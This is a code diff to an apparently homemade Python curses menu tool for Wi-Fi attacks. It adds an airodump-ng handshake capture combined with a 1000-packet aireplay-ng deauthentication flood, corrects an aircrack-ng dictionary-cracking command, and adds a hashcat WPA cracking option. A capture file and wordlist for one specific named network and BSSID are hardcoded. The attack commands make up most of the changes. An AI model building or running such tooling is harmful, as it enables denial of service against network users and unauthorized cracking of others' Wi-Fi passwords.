@@ -33,8 +33,9 @@ interface_mode = ""
 target = ""
 target_BSSID =""
 interface_mac=""
-capture_file=""
-password_list=""
+target_channel=""
+capture_file="\"cap/AXTEL XTREMO-3E6E_62:02:71:88:3E:6F-01.cap\""
+password_list="dictionary/axtel.txt"
 list2 = []
 
 for x in interfaces:
@@ -74,12 +75,13 @@ def set_data():
           {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
         ]},
         { 'title': "Handshake/PMKID tools menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
-          {'title': "NO", 'type': EXITMENU, },
+          {'title': "capture handshake with airplay", 'type': COMMAND, 'command': 'sudo airodump-ng -c '+ target_channel + ' --bssid ' + target_BSSID + ' -w ' + 'cap/' + "\"" + target + "\"" + '_' + target_BSSID + ' ' +  selected_interface + "mon\n" 'sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
         ]},
         { 'title': "Offline WPA/WPA2 cracking menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
           {'title': "select capture file", 'type': COMMAND, 'command': ''  },
           {'title': "select dictionary file file", 'type': COMMAND, 'command': ''  },
-          {'title': "aircrack", 'type': COMMAND, 'command': 'aircrack-ng -w' + password_list + '-b' + capture_file  },
+          {'title': "aircrack", 'type': COMMAND, 'command': 'aircrack-ng -w ' + password_list + ' -b ' + target_BSSID + ' ' + capture_file + ' -l ' + target + '.pswd'  },
+          {'title': "hashcat", 'type': COMMAND, 'command': 'hashcat -m 2500 -o ' + password_list + ' ' + capture_file  },
         ]},
 		    { 'title': "Evil Twin attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
           {'title': "NO", 'type': EXITMENU, },
@@ -164,6 +166,7 @@ def processmenu(menu, parent = None):
   global wilist
   global target_BSSID
   global interface_mac
+  global target_channel
   wifilist = []
   optioncount = len(menu['options'])
   exitmenu = False
@@ -217,7 +220,7 @@ def processmenu(menu, parent = None):
 
       os.system('echo > log ' + str(wilist))
       for x in wilist:
-        wifilist.append({ 'title': x["SSID"], 'type': WIFIOPT, 'command': x["SSID"], 'BSSID': x["ADDRESS"]})
+        wifilist.append({ 'title': x["SSID"], 'type': WIFIOPT, 'command': x["SSID"], 'BSSID': x["ADDRESS"], 'CHANNEL': x['CHANNEL']})
       screen.clear() #clears previous screen on key press and updates display based on pos
       menu = menu_data
       screen.clear() #clears previous screen on key press and updates display based on pos
@@ -231,6 +234,7 @@ def processmenu(menu, parent = None):
     elif menu['options'][getin]['type'] == WIFIOPT:
       target = menu['options'][getin]['command']
       target_BSSID = menu['options'][getin]['BSSID']
+      target_channel= str(menu['options'][getin]['CHANNEL'])
       set_data()
       exitmenu = True #returns to main menu
       screen.clear()
@@ -261,7 +265,7 @@ def errorMessage(errorCode):
      4: "",
      5: ""
  }
- print switcher.get(errorType, "Unrecognizable error")
+ #print switcher.get(errorCode, "Unrecognizable error")
 # Main program
 processmenu(menu_data)
 curses.endwin() #VITAL! This closes out the menu system and returns you to the bash prompt.
